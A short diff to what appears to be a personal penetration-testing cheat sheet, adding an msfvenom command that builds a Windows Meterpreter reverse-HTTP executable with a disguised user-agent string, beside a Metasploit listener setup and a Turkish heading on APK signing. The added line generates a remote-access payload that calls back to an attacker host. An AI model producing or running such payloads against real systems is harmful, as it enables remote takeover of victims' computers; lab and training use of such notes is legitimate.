@@ -413,6 +413,8 @@ service postgresql start
 
 msfconsole use exploit/multi/handler set payload - LHOST=0.0.0.0 - LPORT=4444
 
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+
 # APK İmzalama #
 
 install jdk
